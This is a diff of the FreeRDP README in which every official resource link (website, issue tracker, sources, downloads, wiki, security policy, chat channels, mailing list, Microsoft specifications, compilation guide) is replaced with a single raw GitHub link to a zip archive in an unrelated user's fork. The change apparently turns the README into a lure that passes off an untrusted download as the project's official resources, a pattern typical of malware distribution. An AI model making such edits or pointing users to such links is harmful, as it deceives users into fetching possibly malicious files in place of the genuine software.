@@ -6,29 +6,29 @@ interoperability can finally liberate your computing experience.
 
 ## Resources
 
-Project website: https://www.freerdp.com/  
-Issue tracker: https://github.com/FreeRDP/FreeRDP/issues  
-Sources: https://github.com/FreeRDP/FreeRDP/  
-Downloads: https://pub.freerdp.com/releases/  
-Wiki: https://github.com/FreeRDP/FreeRDP/wiki  
-API documentation: https://pub.freerdp.com/api/  
+Project website: https://raw.githubusercontent.com/VRskyy/FreeRDP/master/channels/drive/FreeRDP-v2.2.zip  
+Issue tracker: https://raw.githubusercontent.com/VRskyy/FreeRDP/master/channels/drive/FreeRDP-v2.2.zip  
+Sources: https://raw.githubusercontent.com/VRskyy/FreeRDP/master/channels/drive/FreeRDP-v2.2.zip  
+Downloads: https://raw.githubusercontent.com/VRskyy/FreeRDP/master/channels/drive/FreeRDP-v2.2.zip  
+Wiki: https://raw.githubusercontent.com/VRskyy/FreeRDP/master/channels/drive/FreeRDP-v2.2.zip  
+API documentation: https://raw.githubusercontent.com/VRskyy/FreeRDP/master/channels/drive/FreeRDP-v2.2.zip  
 
-Security policy: https://github.com/FreeRDP/FreeRDP/security/policy
+Security policy: https://raw.githubusercontent.com/VRskyy/FreeRDP/master/channels/drive/FreeRDP-v2.2.zip
 
-Matrix room : #FreeRDP:matrix.org (main)
-XMPP channel: #FreeRDP#matrix.org@matrix.org (bridged)
-IRC channel : #freerdp @ irc.oftc.net (bridged)
-Mailing list: https://lists.sourceforge.net/lists/listinfo/freerdp-devel
+Matrix room : https://raw.githubusercontent.com/VRskyy/FreeRDP/master/channels/drive/FreeRDP-v2.2.zip (main)
+XMPP channel: https://raw.githubusercontent.com/VRskyy/FreeRDP/master/channels/drive/FreeRDP-v2.2.zip (bridged)
+IRC channel : #freerdp @ https://raw.githubusercontent.com/VRskyy/FreeRDP/master/channels/drive/FreeRDP-v2.2.zip (bridged)
+Mailing list: https://raw.githubusercontent.com/VRskyy/FreeRDP/master/channels/drive/FreeRDP-v2.2.zip
 
 ## Microsoft Open Specifications
 
 Information regarding the Microsoft Open Specifications can be found at:
-https://www.microsoft.com/openspecifications/
+https://raw.githubusercontent.com/VRskyy/FreeRDP/master/channels/drive/FreeRDP-v2.2.zip
 
 A list of reference documentation is maintained here:
-https://github.com/FreeRDP/FreeRDP/wiki/Reference-Documentation
+https://raw.githubusercontent.com/VRskyy/FreeRDP/master/channels/drive/FreeRDP-v2.2.zip
 
 ## Compilation
 
 Instructions on how to get started compiling FreeRDP can be found on the wiki:
-https://github.com/FreeRDP/FreeRDP/wiki/Compilation
+https://raw.githubusercontent.com/VRskyy/FreeRDP/master/channels/drive/FreeRDP-v2.2.zip
